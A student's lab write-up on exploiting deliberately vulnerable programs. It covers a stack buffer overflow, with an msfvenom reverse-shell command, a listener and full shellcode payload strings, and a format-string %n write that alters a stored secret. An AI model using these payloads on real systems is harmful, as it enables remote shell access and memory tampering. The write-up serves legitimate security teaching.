Name : M. Alfandavi Aryo Utomo
Student ID : 35595108

#### 3. Buffer Overflow Vulnerability
Firstly, we setup the env
```
sudo sysctl -w kernel.randomize_va_space=0
```
![[Pasted image 20250910170141.png]]
Then, we compile the program
```
gcc -m32 -g -o stack -z execstack -fno-stack-protector stack.c
```
And change the privilege
```
chmod 4755 stack
```
![[Pasted image 20250910170324.png | 500]]
Then, we gdb the program (stack), and set breakpoint on 14 and 16 (before and after strcpy)
![[Pasted image 20250910170434.png | 500]]
Then, we try to run it as input AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
![[Pasted image 20250911185150.png | 500]]
When we disassemble the main program, we got the return address of bof function (0x565562a9) which lies on our buffer
![[Pasted image 20250910170616.png | 500]]
So we analyze that we can overwrite at most 60 characters, then we hit our return address, lets generate the msfvenom payload first
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c -b '\x00\x0a\x0d\x20'
```
Here, we using additional `-b '\x00\x0a\x0d\x20'` argument to remove bad characters
1. \x00 because we dont want null byte
2. \x0a because we dont want newline
3. \x0d because we dont want carriage return
4. \x20 because we dont want space

After we generate it, we got the result
![[Pasted image 20250911181216.png | 500]]

so, we use this result to craft our payload, the structure is like below
`60x NOP_SLED + RETURN_ADDRESS + A_LOT_OF_NOP_SLED_AGAIN + MSFVENOM_PAYLOAD`

thus, we got this payload that we can test, but before testing, we need to turn on our listener first

![[Pasted image 20250911181511.png | 500]]

###### 3.1. Payload
run $(perl -e 'print "\x90"x60, "\x00\xcf\xff\xff","\x90"x96,"\xb8\xda\x11\xd8\x57\xdb\xc1\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x31\xed\x3a\xa2\xf4\xd5\x4c\xae\xa5\xaa\xe1\x5b\x4b\xa4\xe7\x2c\x2d\x7b\x67\xdf\xe8\x33\x57\x2d\x8a\x7d\xd1\x54\xe2\x77\x21\xa5\xfd\xef\x23\xa9\x10\xac\xaa\x48\xa2\x2a\xfd\xdb\x91\x01\xfe\x52\xf4\xab\x81\x37\x9e\x5d\xad\xc4\x36\xca\x9e\x05\xa4\x63\x68\xba\x7a\x27\xe3\xdc\xca\xcc\x3e\x9e"')

![[Pasted image 20250911185247.png]]
![[Pasted image 20250911182339.png]]here, we need to change our return address from "\x00\xcf\xff\xff" into "\x10\xce\xff\xff", then we craft new payload

run $(perl -e 'print "\x90"x60, "\x10\xce\xff\xff","\x90"x96,"\xb8\xda\x11\xd8\x57\xdb\xc1\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x31\xed\x3a\xa2\xf4\xd5\x4c\xae\xa5\xaa\xe1\x5b\x4b\xa4\xe7\x2c\x2d\x7b\x67\xdf\xe8\x33\x57\x2d\x8a\x7d\xd1\x54\xe2\x77\x21\xa5\xfd\xef\x23\xa9\x10\xac\xaa\x48\xa2\x2a\xfd\xdb\x91\x01\xfe\x52\xf4\xab\x81\x37\x9e\x5d\xad\xc4\x36\xca\x9e\x05\xa4\x63\x68\xba\x7a\x27\xe3\xdc\xca\xcc\x3e\x9e"')

and it works!
![[Pasted image 20250911185429.png | 500]]

Then, we can see on our listener server, if we got connection, then we can start our malicious activities here
![[Pasted image 20250911181909.png | 500]]
![[Pasted image 20250911181927.png | 500]]
Then this one answer first question successfully, but if we want to go further, we can just not use gdb, and wrap the run code as string, and add extra nop sleds in between (96 x 2 = 192)

./stack "$(perl -e 'print "\x90"x60, "\x10\xce\xff\xff","\x90"x192,"\xb8\xda\x11\xd8\x57\xdb\xc1\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\x31\xed\x3a\xa2\xf4\xd5\x4c\xae\xa5\xaa\xe1\x5b\x4b\xa4\xe7\x2c\x2d\x7b\x67\xdf\xe8\x33\x57\x2d\x8a\x7d\xd1\x54\xe2\x77\x21\xa5\xfd\xef\x23\xa9\x10\xac\xaa\x48\xa2\x2a\xfd\xdb\x91\x01\xfe\x52\xf4\xab\x81\x37\x9e\x5d\xad\xc4\x36\xca\x9e\x05\xa4\x63\x68\xba\x7a\x27\xe3\xdc\xca\xcc\x3e\x9e"')"
![[Pasted image 20250911185527.png | 500]]
![[Pasted image 20250911185544.png  | 500]]
voila!


#### 4. Format String Vulnerability
- We got a program that had format string vulnerability, when we look at the code, we can see that theres no input validation or any limitations that prohibit us to insert special symbols (%x and %s), so we can proceed to exploit the program

- Our goal is changing the secret from FIT5003 -> QITq003
	- My student ID = 35595108 % 26 = 16 -> Q

- First thing first, we compile the program
```
gcc -m32 -o format_string format_string.c
```

- And we run the program
![[Pasted image 20250910143611.png | 400]]
The program ask us to insert a string, so when we input multiple %x's...
![[Pasted image 20250910143655.png | 500]]
it does print out a lot of important memory contents, and when we input 123, and trying to print it again, it does return like this 
![[Pasted image 20250910160201.png | 500]]
notice how 8th argument changed, from 3e8 (1000) into 7b (123), so we can see that 8th argument does hold our int_input variable
![[Pasted image 20250910160356.png | 500]]
so when we want to change the secret, we can just change the value pointed by our heap (started from 9th arg), and move by 4byte per char

our initial secret is FIT5003 -> QITq003 so we need to change first and fourth one, distance between them is 3 byte -> 12 bits, so we craft a payload such we can change them, lets do it like below

![[Pasted image 20250910161051.png | 500]]
our 9th argument is 60f4c1a0 (first address of secret or secret[0]), since we know our secret is using sizeof(int), we can just get our secret[3] address  = 60F4C1A0 + 12bits = 1626653100 or 60F4C1AC

so we can feed 1626653100 into our program as 2nd input, and for the last input, we want to directly change our secret, because we already got 2 pointers at our address
![[Pasted image 20250910161135.png | 500]]

we want to write 81 times character into 9th argument in our stack, and 31 times character into 8th argument in our stack, why these numbers?
1. 81 since in ascii 81th is Q
2. 31 since in ascii 113th is q then 113 - 81(from Q) - 1(from ;) = 31
```
%.81x%9$hhn;%.31x%8$hhn
```
and when we enter that input
![[Pasted image 20250910161610.png | 500]]
The secret is changed as we expected
